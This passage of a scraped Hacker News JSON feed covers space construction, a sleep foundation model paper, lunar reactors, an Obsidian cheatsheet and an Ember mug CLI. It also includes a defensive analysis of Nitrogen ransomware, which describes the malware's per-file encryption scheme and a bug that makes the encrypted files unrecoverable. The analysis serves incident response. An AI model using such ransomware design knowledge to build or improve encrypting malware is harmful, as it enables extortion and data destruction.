is Contour Crafting, in which molten regolith and a binding agent are extruded from a nozzle to create infrastructure layer by layer. The process can be used to autonomously build monolithic structures like radiation shielding and rocket landing pads.\n\nContinuing to work with the NIAC program, Khoshnevis also developed a 3D printing method called selective separation sintering, in which heat and pressure are applied to layers of powder to produce metallic, ceramic, or composite objects which could produce small-scale, more-precise hardware. This energy-efficient technique can be used on planetary surfaces as well as in microgravity environments like space stations to produce items including interlocking tiles and replacement parts.\n\nWhile NASAâ€™s efforts are ultimately aimed at developing technologies capable of building a sustainable human presence on other worlds, Khoshnevis is also setting his sights closer to home. He has created a company called Contour Crafting Corporation that will use 3D printing techniques advanced with NIAC funding to fabricate housing and other infrastructure here on Earth.\n\nAnother one of NASAâ€™s partners in additive manufacturing, ICON of Austin, Texas, is doing the same, using 3D printing techniques for home construction on Earth, with robotics, software, and advanced material.\n\nThe ICON company was among the participants inNASAâ€™s 3D-Printed Habitat Challenge, which aimed to advance the technology needed to build housing in extraterrestrial environments. In 2021, ICON used its large-scale 3D printing system to build a 1,700 square-foot simulated Martian habitat that includes crew quarters, workstations and common lounge and food preparation areas. This habitat prototype, called Mars Dune Alpha, is part of NASAâ€™s ongoingCrew Health and Performance Exploration Analog, a series of Mars surface mission simulations scheduled through 2026 at NASAâ€™s Johnson Space Center in Houston.\n\nWith support from NASAâ€™s Small Business Innovation Research program, ICON is also developing an Olympus construction system, which is designed to use local resources on the Moon and Mars as building materials.\n\nThe ICON company uses a robotic 3D printing technique called Laser Vitreous Multi-material Transformation, in which high-powered lasers melt local surface materials, or regolith, that then solidify to form strong, ceramic-like structures. Regolith can similarly be transformed to create infrastructure capable of withstanding environmental hazards like corrosive lunar dust, as well as radiation and temperature extremes.\n\nThe company is also characterizing the gravity-dependent properties of simulated lunar regolith in an experiment called Duneflow, which flew aboard a Blue Origin reusable suborbital rocket system through NASAâ€™s Flight Opportunities program in February 2025. During thatflight test, the vehicle simulated lunar gravity for approximately two minutes, enabling ICON and researchers from NASA to compare the behavior of simulant against real regolith obtained from the Moon during an Apollo mission.\n\nLearn more:https://www.nasa.gov/space-technology-mission-directorate/\n\nDiscover More ...\n\nSpace Technology Mission Directorate\n\nNASA Innovative Advanced Concepts\n\nSTMD Solicitations and Opportunities\n\nTechnology\n\nShare\n\nDetails\n\nRelated Terms\n\nSpace Technology Mission Directorate\n\nFlight Opportunities Program\n\nNASA Innovative Advanced Concepts (NIAC) Program\n\nTechnology",
      "url": "https://www.nasa.gov/directorates/stmd/nasa-enables-construction-technology-for-moon-and-mars-exploration/",
      "author_username": "andsoitis",
      "author_category": "unknown",
      "media": [
        {
          "type": "image",
          "url": "https://assets.science.nasa.gov/dynamicimage/assets/science/esd/eo/images/iotd/2026/extreme-january-cold/coldair_gmao_20260129_th.jpg?w=1024",
          "alt": "Extreme January Cold"
        },
        {
          "type": "image",
          "url": "https://assets.science.nasa.gov/dynamicimage/assets/science/psd/solar-system/skywatching/2026/february/Andromeda%20above%20Mono%20Lake_credit_NASA_Preston%20Dyches_CC%20BY%20NC%202.0.jpg?w=1024",
          "alt": "Whatâ€™s Up: February 2026 Skywatching Tips from NASA"
        }
      ],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:05.330928",
      "published_at": "2026-02-03T08:59:31",
      "scraped_at": "2026-02-03T09:03:05.330938",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46871053",
        "kids_count": 0,
        "sections": [
          "new_stories"
        ]
      },
      "content_hash": "8b7d2f121e36020e763e31fd8349842a"
    },
    {
      "id": "ba6237accae0051c00c6c545e6d08415",
      "source": "hackernews",
      "source_id": "46871049",
      "title": "Ask HN: Where do you guys go to find new links/websites etc.?",
      "content": "Ask HN: Where do you guys go to find new links/websites etc.?",
      "url": null,
      "author_username": "desidaroo",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:05.330984",
      "published_at": "2026-02-03T08:58:48",
      "scraped_at": "2026-02-03T09:03:05.330987",
      "metadata": {
        "item_type": "ask_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46871049",
        "kids_count": 0,
        "sections": [
          "new_stories"
        ]
      },
      "content_hash": "a91b45a5b0f8f7adf136b9a31daa3ee0"
    },
    {
      "id": "dceaa3ee34ce9dbf010419cc24572981",
      "source": "hackernews",
      "source_id": "46871046",
      "title": "A multimodal sleep foundation model for disease prediction",
      "content": "Subjects\n\nBiomedical engineering\n\nDiseases\n\nAbstract\n\nSleep is a fundamental biological process with broad implications for physical and mental health, yet its complex relationship with disease remains poorly understood. Polysomnography (PSG)â€”the gold standard for sleep analysisâ€”captures rich physiological signals but is underutilized due to challenges in standardization, generalizability and multimodal integration. To address these challenges, we developed SleepFM, a multimodal sleep foundation model trained with a new contrastive learning approach that accommodates multiple PSG configurations. Trained on a curated dataset of over 585,000â€‰hours of PSG recordings from approximately 65,000 participants across several cohorts, SleepFM produces latent sleep representations that capture the physiological and temporal structure of sleep and enable accurate prediction of future disease risk. From one night of sleep, SleepFM accurately predicts 130 conditions with a C-Index of at least 0.75 (Bonferroni-correctedP<â€‰0.01), including all-cause mortality (C-Index, 0.84), dementia (0.85), myocardial infarction (0.81), heart failure (0.80), chronic kidney disease (0.79), stroke (0.78) and atrial fibrillation (0.78). Moreover, the model demonstrates strong transfer learning performance on a dataset from the Sleep Heart Health Studyâ€”a dataset that was excluded from pretrainingâ€”and performs competitively with specialized sleep-staging models such as U-Sleep and YASA on common sleep analysis tasks, achieving meanF1scores of 0.70â€“0.78 for sleep staging and accuracies of 0.69 and 0.87 for classifying sleep apnea severity and presence. This work shows that foundation models can learn the language of sleep from multimodal sleep recordings, enabling scalable, label-efficient analysis and disease prediction.\n\nSimilar content being viewed by others\n\nIntegrating physiological signals for enhanced sleep apnea diagnosis with SleepNet\n\nDeep learning-based sleep stage classification with cardiorespiratory and body movement activities in individuals with suspected sleep disorders\n\nHealth risks and genetic architecture of objectively measured multidimensional sleep health\n\nMain\n\nSleep is a complex process characterized by intricate interactions across physiological systems, including brain, heart, respiratory and muscle activity1. PSGâ€”the gold standard for sleep evaluationâ€”captures these interactions through recordings of several modalities, including brain activity signals (BAS, including electroencephalogram (EEG) and electrooculogram (EOG)), electrocardiography (ECG), electromyography (EMG) and respiratory signals2.\n\nSleep disorders affect millions of people and are increasingly recognized as indicators of, and contributors to, various health conditions3. Sleep disturbances often precede the clinical onset of numerous conditions, such as psychiatric disorders4, neurodegenerative diseases5and cardiovascular disorders6. These associations highlight the important role sleep plays in maintaining overall health and underscores its predictive potential across a wide spectrum of diseases. However, most existing studies have focused on identifying links between sleep and specific diseases using isolated metrics or manual annotations, leaving much of the complexity of sleep physiology, as captured in PSG, underutilized.\n\nRecent advances in deep learning have enabled the use of PSGâ€™s multimodal data for tasks ranging from sleep staging and apnea detection to predicting conditions such as atrial fibrillation, biological aging and narcolepsy3,7,8,9,10. Despite this progress, current approaches face key limitations: they focus on individual outcomes, depend on supervised learning with expert-labeled data and are trained on relatively small datasets (2,500â€“15,913 recordings)3,7,9,10,11. Manual annotations are time consuming and prone to inter-rater variability, making scaling difficult. Moreover, existing models lack flexibility across recording environments, generalize poorly across cohorts and often fail to exploit the richness of multimodal sleep signals. There remains a need for robust, generalizable architectures and systematic evaluation of sleepâ€™s predictive value across a broad range of health conditions.\n\nFoundation models have emerged as a transformative approach in machine learning, enabling robust representation learning from large-scale, unlabeled data12. By leveraging self-supervised learning, these models can be fine-tuned efficiently for diverse applications. In biomedicine, foundation models have demonstrated remarkable capabilities in analyzing complex, heterogeneous datasets, driving advances in disease prediction, patient stratification and therapeutic discovery13,14. Their ability to extract meaningful patterns from large-scale data has addressed many challenges associated with the diverse and high-dimensional nature of clinical datasets.\n\nDespite these successes, their application to sleep remains limited. Sleep data, particularly from PSG, presents unique challenges due to its complexity and variability, including differences in the number and types of recording channel across clinical cohorts. Most sleep studies have focused narrowly on sleep-specific outcomes, constraining the broader potential of foundation models for disease prediction. In preliminary work, we explored self-supervised learning on PSG data in a smaller cohort of participants11. Although this effort highlighted the potential of foundation models for analyzing sleep data, it targeted primarily sleep-specific outcomes and lacked the flexibility to accommodate the diverse configurations of PSG recordings. These limitations emphasize the need for models that can generalize across heterogeneous datasets and systematically uncover the role of sleep in predicting a wider range of diseases.\n\nIn this paper we present SleepFM, a foundation model trained on over 585,000â€‰h of PSG data from 65,000+ participants. SleepFM captures the diverse information present in multimodal sleep recordingsâ€”integrating EEG, ECG, EMG and respiratory signals. Its channel-agnostic architecture enables joint learning across several modalities, producing representations that generalize across environments. We also introduce a new leave-one-out (LOO) contrastive learning (CL) (LOO-CL) algorithm that aligns information across modalities during pretraining while remaining resilient to missing or heterogeneous channels during inference. Our model uses 5â€“25 times more data than previously trained supervised sleep3,7,9,10or biosignal models15,16.\n\nInspired by phenome-wide association studies (PheWAS)17, we examined whether sleep characteristics, as captured by SleepFM, can predict the onset of a wide range of diseases. Leveraging electronic health record (EHR) disease codes, we develop a framework to systematically explore predictive associations between multimodal sleep and diverse health conditions.\n\nDataset and SleepFM architecture\n\nWe describe our dataset and training procedures in detail inMethods. Briefly, we used PSG data from four primary cohorts: Stanford Sleep Clinic (SSC)11, BioSerenity18,19, the Multi-Ethnic Study of Atherosclerosis (MESA)20,21and the Outcomes of Sleep Disorders in Older Men (MrOS)20,22. SSC includes 35,052 studies from participants aged 1â€“100â€‰years; BioSerenity adds 18,900 studies from people aged 7â€“90â€‰years; MESA and MrOS contribute 2,237 and 3,930 PSGs, respectively, from older adults. Together, these cohorts span 65,000 participants and more than 585,000â€‰h of sleep recordings. We further evaluated generalization using the Sleep Heart Health Study (SHHS)20,23â€”a multicenter dataset of 6,441 adults aged 40â€‰years and older, held out from pretraining and used solely for transfer learning. Dataset distributions postfiltering are shown in Table1. Demographics for SSC and BioSerenity appear in Extended Data Tables1and2, whereas details for SHHS, MrOS and MESA are available in their respective publications.\n\nOur preprocessing pipeline begins by resampling all signals to 128â€‰Hz for consistency across cohorts. Signals are then segmented into 5-s windows, which serve as the modelâ€™s fundamental input tokens. The architecture includes one-dimensional (1D) convolutional layers for feature extraction, followed by channel-agnostic attention pooling to address variability in channel number and order across cohorts. A transformer block captures temporal dependencies over a 5-min context window. During pretraining, we use a multimodal CL objective to align representations across all modalities. The robustness of the model stems from its channel-agnostic design, enabling it to accommodate missing channels, varying channel counts and heterogeneous signal types.\n\nFor downstream tasks, we leverage the pretrained modelâ€™s embeddings through lightweight fine-tuning. The token embeddings from different modalities are pooled again and processed by a two-layer long short-term memory (LSTM) network before passing through task-specific output heads. For patient-level prediction tasks (for example, disease prediction), an additional temporal pooling layer before the output layer compresses all token embeddings into a single 128-dimensional embedding.\n\nTo evaluate model performance across tasks, we use appropriate task-specific metrics. For classification tasks such as sex classification, we report area under the receiver operating characteristic curve (AUROC) and area under the precision-recall curve (AUPRC); for sleep apnea classification we show confusion matrices and report accuracy; for age estimation, we use mean absolute error (MAE) and Pearson correlation. Sleep staging is evaluated using theF1score, which is well suited for class-imbalanced settings. For disease prediction, we report AUROC and Harrellâ€™s concordance index (C-Index)â€”a standard survival analysis metric that measures the proportion of correctly ranked risk pairs. All metrics range from 0 to 1, with higher values indicating bette",
      "url": "https://www.nature.com/articles/s41591-025-04133-4",
      "author_username": "mhb",
      "author_category": "unknown",
      "media": [
        {
          "type": "image",
          "url": "https://media.springernature.com/w215h120/springer-static/image/art%3A10.1038%2Fs41598-025-16154-7/MediaObjects/41598_2025_16154_Fig1_HTML.png",
          "alt": ""
        },
        {
          "type": "image",
          "url": "https://media.springernature.com/w215h120/springer-static/image/art%3A10.1038%2Fs41598-023-45020-7/MediaObjects/41598_2023_45020_Fig1_HTML.png",
          "alt": ""
        },
        {
          "type": "image",
          "url": "https://media.springernature.com/w215h120/springer-static/image/art%3A10.1038%2Fs41467-025-62338-0/MediaObjects/41467_2025_62338_Fig1_HTML.png",
          "alt": ""
        }
      ],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:06.164181",
      "published_at": "2026-02-03T08:58:30",
      "scraped_at": "2026-02-03T09:03:06.164202",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46871046",
        "kids_count": 0,
        "sections": [
          "new_stories"
        ]
      },
      "content_hash": "aca6b408de92316fbe7be6ab845b4364"
    },
    {
      "id": "585798ad888c8860e48ffd615e7185c8",
      "source": "hackernews",
      "source_id": "46871039",
      "title": "China, Russia, and U.S. Race to Develop Lunar Nuclear Reactors",
      "content": "China, Russia, and U.S. Race to Develop Lunar Nuclear Reactors\n\nNASA wants one by 2030. Why the rush?\n\nNASA wants one by 2030. Why the rush?\n\nEmily Waltz is the power and energy editor at IEEE Spectrum.\n\nNASA researchers envision nuclear microreactors on the moon to sustain extended human research expeditions there.",
      "url": "https://spectrum.ieee.org/lunar-nuclear-reactor-nasa-moon",
      "author_username": "andsoitis",
      "author_category": "unknown",
      "media": [
        {
          "type": "image",
          "url": "https://spectrum.ieee.org/media-library/tall-solar-panels-on-the-moon-s-surface-connected-to-a-distant-lunar-base-via-cables.jpg?id=61501481&width=1200&height=724",
          "alt": "Tall solar panels on the Moon's surface connected to a distant lunar base via cables."
        }
      ],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:06.383111",
      "published_at": "2026-02-03T08:58:02",
      "scraped_at": "2026-02-03T09:03:06.383121",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46871039",
        "kids_count": 0,
        "sections": [
          "new_stories"
        ]
      },
      "content_hash": "bc46c47c26f68e41aae16d5630d0eddb"
    },
    {
      "id": "547356866b00928d74a2450b33f4d1a5",
      "source": "hackernews",
      "source_id": "46871031",
      "title": "Nitrogen Ransomware: ESXi malware has a bug",
      "content": "Nitrogen Ransomware: ESXi malware has a bug!\n\nNitrogen ransomware was derived from the previously leaked Conti 2 builder code, and is similar to Nitrogen ransomware, but a coding mistake in the ESXi malware causes it to encrypt all the files with the wrong public key, irrevocably corrupting them. This means that even the threat actor is incapable of decrypting them, and that victims that are without viable backups have no ability to recover their ESXi encrypted servers. Paying a ransom will not assist these victims, as the decryption key/ tool will not work.\n\nProper public/private key encryption progresses via the following common operations:\n\nThe malware is run on a server full of files.\n\nThe malware is run on a server full of files.\n\nFor each file, the malware randomly generates a private Curve25519 key and its corresponding public key.\n\nFor each file, the malware randomly generates a private Curve25519 key and its corresponding public key.\n\nThe malware exchanges the private key with its master public key, producing a shared secret.\n\nThe malware exchanges the private key with its master public key, producing a shared secret.\n\nThe shared secret is used as a ChaCha8 key to encrypt the file contents.\n\nThe shared secret is used as a ChaCha8 key to encrypt the file contents.\n\nThe malware saves the file public key to the file footer.\n\nThe malware saves the file public key to the file footer.\n\nProper public/private decryption progresses via the following operations:\n\nA decryption executable is run on a previously encrypted server full of files.\n\nA decryption executable is run on a previously encrypted server full of files.\n\nThe decryption tool contains the master private Curve25519 key that goes with the master public key that was used for encryption.\n\nThe decryption tool contains the master private Curve25519 key that goes with the master public key that was used for encryption.\n\nFor each file, the decryption tool exchanges the master private key with the file public key that was saved to the footer, which produces the same shared secret that was used for encryption.\n\nFor each file, the decryption tool exchanges the master private key with the file public key that was saved to the footer, which produces the same shared secret that was used for encryption.\n\nThe shared secret can then be used as a ChaCha8 key to decrypt the file contents.\n\nThe shared secret can then be used as a ChaCha8 key to decrypt the file contents.\n\nThe file is decrypted.\n\nThe file is decrypted.\n\nThe Nitrogen ESXi Bug\n\nWithin the Nitrogen ESXi malware, the public key is stored as a stack variable at offset rsp+0x20 (shown below)\n\nHowever, after the public key is loaded, another variable is stored at rsp+0x1c. It's a QWORD, so it takes up the 8 bytes from rsp+0x1c to rsp+0x24. That means 4 bytes of the public key are overwritten!Â  This is a clear mistake by the malware developer.\n\nThis is what the public key looks like in memory before the instruction at `0x401890` is executed:\n\nAnd this is what it looks like after it's executed:\n\nNote the 4 bytes that have been replaced with 0x00s.\n\nBecause of this bug, the corrupted public key is used in the key exchange to encrypt each file. Normally, when a public-private Curve25519 keypair is generated, the private key is generated, first and then the public key derived subsequently based on the private key. The resulting corrupted public key wasn't generated based on a private key, it was generated by mistakenly overwriting a few bytes of another public key. The final outcome is that no one actually knows the private key that goes with the corrupted public key. Files that were encrypted with the corrupted public key can not be decrypted by any means, including by paying a ransomware. The threat actor themselves will be unable to decrypt the files in a test.\n\nOrganizations impacted by Nitrogent Ransomware encryption must be extremely careful when analyzing their recovery options. Any ESXi encrypted files that are without viable backups, must be analyzed in conjunction with the corresponding malware that encrypted them to ascertain their status.",
      "url": "https://www.coveware.com/blog/2026/2/2/nitrogen-ransomware-esxi-malware-has-a-bug",
      "author_username": "campuscodi",
      "author_category": "unknown",
      "media": [
        {
          "type": "image",
          "url": "https://images.squarespace-cdn.com/content/v1/5ab16578e2ccd10898976178/666a8968-960f-42b8-97bf-b9dd221fb53c/1.png",
          "alt": ""
        },
        {
          "type": "image",
          "url": "https://images.squarespace-cdn.com/content/v1/5ab16578e2ccd10898976178/2025698f-b14e-4f8c-8d8a-64f73528e1e3/2.png",
          "alt": ""
        },
        {
          "type": "image",
          "url": "https://images.squarespace-cdn.com/content/v1/5ab16578e2ccd10898976178/9be20e7f-924d-42e1-af3b-95058512a912/4.png",
          "alt": ""
        }
      ],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:06.867276",
      "published_at": "2026-02-03T08:57:35",
      "scraped_at": "2026-02-03T09:03:06.867290",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46871031",
        "kids_count": 0,
        "sections": [
          "new_stories"
        ]
      },
      "content_hash": "759fa7dd44bcca2c49de163d08c26fb4"
    },
    {
      "id": "aa635623c0fb6f7216b20ed1b1ac104e",
      "source": "hackernews",
      "source_id": "46871028",
      "title": "Obsidian Markdown Cheatsheet",
      "content": "Rafael Pinheiro\n\nRafael Pinheiro is founder of Ottic, building AI-native editorial infrastructure that helps companies turn expertise into scalable, high-quality content engines optimized for Google and AI search. Previously, he was founder of Clipping, an education platform focused on high-performance learning, where he led growth, product, and content at scale.\n\nYou opened Obsidian, created your first note, and typed some text. It looksâ€¦ plain. You know Markdown can make it betterâ€”headings, bold text, links between notesâ€”but every time you need a specific syntax, youâ€™re searching the web again.\n\nThis Obsidian cheatsheet exists so you donâ€™t have to.\n\nBookmark it, and youâ€™ll have every Obsidian Markdown syntax in one place: the basics youâ€™ll use constantly, the Obsidian-specific features that make linking powerful, and the formatting tricks that keep notes readable.\n\nKey Takeaways\n\nObsidian uses standard Markdown plus its own extensions like [[wikilinks]] and callouts\n\nInternal links with [[double brackets]] are the foundation of connected notes\n\nCallouts turn plain blockquotes into visual highlights (tips, warnings, notes)\n\nYou can embed entire notes or specific sections inside other notes\n\nTables, code blocks, and task lists all workâ€”with some syntax to remember\n\nObsidian Markdown Basics: Text Formatting\n\nThese work in almost every Markdown editor, Obsidian included.\n\nFor bold and italic, you can also use underscores (__bold__and_italic_), but asterisks are more common.\n\nHeadings in Obsidian Markdown\n\nHeadings create structure. Use the # symbol followed by a space:\n\nTheMarkdown Guiderecommends always putting a space after the # symbolsâ€”some parsers require it.\n\nIn Obsidian, headings also become anchor points. You can link directly to them from other notes (more on that below).\n\nLists: Ordered and Unordered\n\nBullet listsuse-,*, or+:\n\nNumbered listsuse any number followed by a period:\n\nHow it looks in Obsidian:\n\nObsidian auto-continues lists when you press Enter, and Tab/Shift+Tab adjusts nesting.\n\nObsidian Markdown Links: The Core Feature\n\nLinks are where Obsidian diverges from standard Markdown. Understanding both formats helps you decide which fits your workflow.\n\nWikilinks (Obsidian Default)\n\nThe double-bracket syntax creates internal links:\n\nTo display different text than the note name:\n\nAccording to discussions on theObsidian Forum, wikilinks offer better integration with Obsidian features like backlinksâ€”the panel showing which notes link to your current note.\n\nHow it looks in Obsidian:\n\nStandard Markdown Links\n\nIf you need compatibility with other editors:\n\nYou can switch Obsidianâ€™s default under Settings â†’ Files & Links â†’ Use [[Wikilinks]].\n\nExternal Links\n\nFor websites, standard Markdown syntax applies:\n\nLinking to Headings\n\nLink to a specific section within a note:\n\nOr within the same note:\n\nLinking to Blocks\n\nObsidian lets you link to any paragraph or list item. Add ^ followed by an identifier:\n\nWhen you type[[Note Name#^, Obsidian suggests available blocks.\n\nObsidian Markdown Embeds\n\nEmbedding pulls content from one note into another. If you update the source, the embedded version updates too.\n\nThe exclamation mark!before the brackets is what triggers embedding versus linking.\n\nHow it looks in Obsidian:\n\nObsidian Callouts: Visual Highlights\n\nCallouts transform blockquotes into color-coded boxes. Theyâ€™re one of Obsidianâ€™s most useful extensions to standard Markdown.\n\nBasic syntax:\n\nWith a custom title:\n\nAvailable Callout Types\n\nHow it looks in Obsidian:\n\nAccording toObsidianâ€™s documentationand guides fromObsidian Rocks, these types are built in:\n\nFoldable Callouts\n\nAdd-(collapsed by default) or+(expanded by default) after the type:\n\nHow it looks in Obsidian:\n\nThis creates accordion-style sectionsâ€”useful for supplementary information that shouldnâ€™t clutter the main text.\n\nCode Blocks in Obsidian Markdown\n\nFor inline code, wrap text in backticks:\n\nFor multi-line code, use triple backticks with an optional language for syntax highlighting:\n\nObsidian supports highlighting for most programming languages. TheCommonMark specificationdefines fenced code blocks, and Obsidian extends it with language-specific coloring.\n\nTables in Obsidian Markdown\n\nTables use pipes|and hyphens-:\n\nAlignment options:\n\nHow it looks in Obsidian:\n\nCreating tables manually gets tedious. Many Obsidian users install theAdvanced Tables pluginfor easier editing, or use AI tools to generate table syntax from descriptions.\n\nCheck our deep dive inMarkdown Tablesarticle\n\nTask Lists and Checkboxes\n\nStandard task list syntax works:\n\nHow it looks in Obsidian:\n\nClicking the checkbox in preview mode toggles completion. Some community plugins extend this with additional states (cancelled, scheduled, etc.).\n\nBlockquotes\n\nStandard blockquote syntax:\n\nNested quotes:\n\nHow it looks in Obsidian:\n\nHorizontal Rules\n\nThree or more hyphens, asterisks, or underscores create a divider:\n\nor\n\nFootnotes\n\nFootnotes let you add references without cluttering the main text:\n\nThe[^1]marker can be any unique identifierâ€”numbers, words, whatever helps you keep track. Obsidian renders all footnotes at the bottom of the note in preview mode, regardless of where you place the definition in your source.\n\nHow it looks in Obsidian:\n\nComments (Hidden Text)\n\nObsidian supports hidden comments that only appear in editing mode:\n\nYou can also use inline comments:Some visible text %%hidden note%% more visible text.\n\nHow it looks in Obsidian:\n\nComments are especially useful when collaborating through shared vaultsâ€”leave editorial notes without affecting the published output.\n\nTags\n\nTags create searchable labels across your vault:\n\nNested tags use forward slashes to create hierarchies:\n\nSearchingtag:#projectreturns all notes with #project and any subtag beneath it.\n\nFor a deeper dive into tag strategies, see ourguide to using tags in Obsidian Markdown.\n\nYAML Frontmatter (Properties)\n\nThe properties block at the top of a note stores metadata:\n\nFrontmatter must be the very first thing in the fileâ€”no blank lines above it. Obsidian displays these fields in a clean Properties panel in editing mode.\n\nHow it looks in Obsidian:\n\nYou can use properties withDataviewto query notes like a database: filter by status, sort by date, or list all notes with a specific tag.\n\nMath Notation (LaTeX)\n\nObsidian renders LaTeX math viaMathJax:\n\nInline math uses single dollar signs:\n\nBlock math uses double dollar signs:\n\nHow inline math looks in Obsidian:\n\nHow block math looks in Obsidian:\n\nCommon symbols:\\alpha(Î±),\\beta(Î²),\\infty(âˆ),\\neq(â‰ ),\\leq(â‰¤),\\rightarrow(â†’).\n\nDiagrams with Mermaid\n\nObsidian supportsMermaiddiagrams inside fenced code blocks:\n\nHow it looks in Obsidian:\n\nMermaid supports flowcharts, sequence diagrams, Gantt charts, pie charts, and more. The diagrams render directly in Obsidianâ€™s preview modeâ€”no plugins needed.\n\nA sequence diagram example:\n\nHow it looks in Obsidian:\n\nObsidian Markdown vs Standard Markdown: Whatâ€™s Different\n\nTheMarkdown Guideâ€™s Obsidian referencenotes several differences from basic Markdown:\n\nSupported in Obsidian (all covered above):\n\nFootnotes ([^1])\n\nTask lists (- [ ])\n\nHighlight (==text==)\n\nTables\n\nFenced code blocks\n\nMath notation (LaTeX via MathJax)\n\nDiagrams (Mermaid syntax)\n\nComments (%% hidden %%)\n\nTags and nested tags\n\nProperties tags (YAML frontmatter)\n\nNot supported natively:\n\nHeading IDs\n\nDefinition lists\n\nEmoji shortcodes (use copy-paste or theEmoji Shortcodes plugin)\n\nSubscript/superscript (though HTML tags work)\n\nCheck our article on a complete reference guide and anupdated cheatsheet for standard markdown.\n\nManaging Your Obsidian Vault with Desktop Commander\n\nOnce youâ€™re comfortable with Markdown syntax, organization becomes the next challenge. Your vault grows, notes multiply, and finding things gets harder.\n\nDesktop Commandercan help manage Obsidian vaults through natural language. Since Obsidian stores everything as plain Markdown files, you can work with them like any other files on your computer:\n\nPrompts to try:\n\nThis kind offile management through conversationworks because Obsidianâ€™s files are just Markdownâ€”no proprietary format, no database to query. The AI reads and organizes your actual files.\n\nFor bulk operationsâ€”renaming, moving, finding duplicates, consolidating tagsâ€”describing what you want is often faster than clicking through folders manually.\n\nTry Desktop Commander AppDesktop Commander reads your files, runs commands, and automates workflows â€” all in natural language.Download Now\n\nTry Desktop Commander App\n\nDesktop Commander reads your files, runs commands, and automates workflows â€” all in natural language.\n\nCheck theprompt libraryfor examples of file organization prompts that apply to Obsidian vaults.\n\nMost-Used Obsidian Markdown: Quick Reference Guide\n\nFor fast lookup, hereâ€™s everything youâ€™ll use regularly:\n\nCommunity Resources\n\nObsidian Help: Basic Formattingâ€“ Official documentation\n\nObsidian Forum: Markdown Syntaxâ€“ Community discussions and edge cases\n\nFace Dragons Cheatsheetâ€“ Comprehensive visual reference\n\nObsidian Hub: Markdown Syntaxâ€“ Community-maintained guide\n\nFrequently Asked Questions\n\nWhat to Learn Next\n\nOnce Markdown syntax feels natural, explore:\n\nTemplatesâ€“ Create reusable note structures\n\nProperties/Frontmatterâ€“ Add metadata to notes (tags, dates, custom fields)\n\nDataview pluginâ€“ Query your notes like a database\n\nGraph viewâ€“ Visualize connections between notes\n\nThe power ofbuilding a knowledge base in Obsidian with AIcomes from combining simple Markdown with organizational tools, such as Desktop Commander, and keeping everything in plain text files you control.\n\nTry Desktop Commander AppDesktop Commander reads your files, runs commands, and automates workflows â€” all in natural language.Download Now\n\nTry Desktop Commander App\n\nDesktop Commander reads your files, runs commands, and automates workflows â€” all in natural language.\n\nRelated",
      "url": "https://desktopcommander.app/blog/2026/02/03/obsidian-markdown-cheatsheet-every-syntax-you-actually-need/",
      "author_username": "rafaepta",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:07.138879",
      "published_at": "2026-02-03T08:57:27",
      "scraped_at": "2026-02-03T09:03:07.138890",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46871028",
        "kids_count": 0,
        "sections": [
          "new_stories"
        ]
      },
      "content_hash": "8ec5bb674190220587950c5be5f87afa"
    },
    {
      "id": "2dd55cd9f4f0f07659e3bdad4cd66022",
      "source": "hackernews",
      "source_id": "46871026",
      "title": "Show HN: Ember-mug â€“ I made a CLI for the Ember Coffee Mug",
      "content": "Ember&#x27;s mobile app isn&#x27;t great and I would prefer to see my coffee mug on the screens I am already looking at. Plus now I can put it right next to my Claude Code and it looks great.<p>Submit issues on Github if you find any problems. Feel free to submit a PR too.<p><a href=\"https:&#x2F;&#x2F;ember-mug.benjaminjsinger.com&#x2F;\" rel=\"nofollow\">https:&#x2F;&#x2F;ember-mug.benjaminjsinger.com&#x2F;</a>\n<a href=\"https:&#x2F;&#x2F;www.npmjs.com&#x2F;package&#x2F;ember-mug\" rel=\"nofollow\">https:&#x2F;&#x2F;www.npmjs.com&#x2F;package&#x2F;ember-mug</a>\n<a href=\"https:&#x2F;&#x2F;github.com&#x2F;singerbj&#x2F;ember-mug\" rel=\"nofollow\">https:&#x2F;&#x2F;github.com&#x2F;singerbj&#x2F;ember-mug</a>",
      "url": "https://ember-mug.benjaminjsinger.com/",
      "author_username": "singerbj",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 2,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:07.564391",
      "published_at": "2026-02-03T08:57:09",
      "scraped_at": "2026-02-03T09:03:07.564418",
      "metadata": {
        "item_type": "show_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46871026",
        "kids_count": 0,
        "sections": [
          "new_stories"
        ]
      },
      "content_hash": "4bd420bd951cf8fc33f86a882cad6a9e"
    },
    {
      "id": "b276a9f390b660a0b43757d40f09ef25",
      "source": "hackernews",
      "source_id": "46871017",
      "title": "Show HN: Open-source taxonomy of 122 AI/LLM attack vectors",
